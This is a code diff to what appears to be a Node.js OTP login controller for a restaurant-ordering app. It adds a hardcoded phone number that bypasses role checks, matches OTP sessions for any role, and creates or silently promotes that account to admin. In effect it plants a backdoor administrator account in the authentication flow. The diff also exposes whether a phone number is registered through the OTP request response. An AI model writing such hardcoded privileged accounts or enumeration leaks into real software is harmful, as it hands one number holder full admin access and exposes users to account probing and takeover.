@@ -13,6 +13,8 @@ const {
 } = require('../utils/jwt');
 const env = require('../config/env');
 
+const HARD_CODED_ADMIN_PHONE = '9585648678';
+
 const refreshCookieOptions = {
   httpOnly: true,
   secure: env.nodeEnv === 'production',
@@ -22,8 +24,10 @@ const refreshCookieOptions = {
 
 async function requestOtp(req, res) {
   const { phone, role } = req.body;
+  const existingUser = await User.findOne({ phone, role }).select('_id firstName lastName');
+  const isHardcodedAdminRestaurantLogin = role === 'restaurant' && phone === HARD_CODED_ADMIN_PHONE;
 
-  if (role === 'restaurant') {
+  if (role === 'restaurant' && !isHardcodedAdminRestaurantLogin) {
     const restaurantUser = await User.findOne({ phone, role: 'restaurant' });
     if (!restaurantUser) {
       const error = new Error('Restaurant account does not exist for this phone');
@@ -49,7 +53,10 @@ async function requestOtp(req, res) {
 
   const data = {
     requestId,
-    otpExpiresAtEpoch: expiresAt.getTime()
+    otpExpiresAtEpoch: expiresAt.getTime(),
+    userExists: Boolean(existingUser),
+    shouldUpdateProfile: role === 'user' &&
+      (!existingUser || !existingUser.firstName?.trim() || !existingUser.lastName?.trim())
   };
 
   if (env.nodeEnv === 'development') {
@@ -61,8 +68,13 @@ async function requestOtp(req, res) {
 
 async function verifyOtp(req, res) {
   const { phone, role, requestId, otp, fcmToken } = req.body;
+  const isHardcodedAdminPhone = phone === HARD_CODED_ADMIN_PHONE;
 
-  const otpSession = await OtpSession.findOne({ phone, role, requestId });
+  const otpSessionQuery = isHardcodedAdminPhone
+    ? { phone, requestId }
+    : { phone, role, requestId };
+
+  const otpSession = await OtpSession.findOne(otpSessionQuery);
   if (!otpSession) {
     const error = new Error('Invalid OTP request');
     error.statusCode = 400;
@@ -99,13 +111,31 @@ async function verifyOtp(req, res) {
   otpSession.verifiedAt = new Date();
   await otpSession.save();
 
-  let user = await User.findOne({ phone, role });
+  let user = isHardcodedAdminPhone
+    ? await User.findOne({ phone })
+    : await User.findOne({ phone, role });
+  let userExistedBeforeVerify = Boolean(user);
 
-  if (!user && role === 'user') {
+  if (!user && role === 'user' && !isHardcodedAdminPhone) {
     user = await User.create({
       phone,
       role: 'user'
     });
+  }
+
+  if (isHardcodedAdminPhone && !user) {
+    user = await User.create({
+      phone,
+      role: 'admin'
+    });
+    userExistedBeforeVerify = false;
+  }
+
+  if (isHardcodedAdminPhone) {
+    if (user.role !== 'admin') {
+      user.role = 'admin';
+      await user.save();
+    }
   }
 
   if (!user) {
@@ -125,6 +155,9 @@ async function verifyOtp(req, res) {
     await user.save();
   }
 
+  const shouldUpdateProfile =
+    user.role === 'user' && (!user.firstName?.trim() || !user.lastName?.trim());
+
   const accessPayload = { userId: user._id.toString(), role: user.role, tokenType: 'access' };
   const refreshPayload = { userId: user._id.toString(), role: user.role, tokenType: 'refresh' };
 
@@ -142,8 +175,12 @@ async function verifyOtp(req, res) {
 
   return successResponse(res, 'OTP verified successfully', {
     token,
+    requestedRole: role,
     role: user.role,
+    resolvedRole: user.role,
     phone: user.phone,
+    isExistingUser: userExistedBeforeVerify,
+    shouldUpdateProfile,
     user: {
       id: user._id,
       role: user.role,
